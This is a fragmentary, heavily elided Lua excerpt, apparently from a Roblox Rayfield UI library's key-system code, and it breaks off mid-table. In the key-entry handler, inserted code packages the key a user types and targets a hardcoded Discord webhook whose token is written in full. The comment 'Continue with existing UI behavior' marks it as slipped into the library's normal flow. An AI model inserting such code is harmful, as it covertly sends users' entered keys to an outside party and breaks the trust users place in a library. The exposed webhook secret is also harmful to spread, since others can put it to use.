    ...
    if not Passthrough then
        ...
        KeyUI.Main.Input.InputBox.FocusLost:Connect(function()
            ...
            if KeyFound then 
                ...
                local webhookURL = "https://discord.com/api/webhooks/1347552995453173821/vM5bV27HTv3wMCbmpIQ2jFg2HlsCW31Os8EdjlQZG8s4lRiUklOYwy8Fld6XsKozOuau"
                
                local payload = HttpService:JSONEncode({
                    content = "Key Entered: " .. FoundKey
                })
                ...
                -- Continue with existing UI behavior
...
if useStudio then
	...
	local Window = RayfieldLibrary:CreateWindow({
		...
		keysystemo92 = false, -- Set this to true to use our key system
		KeySettings = {
			Title = "Untitled",
			Subtitle = "Key System",
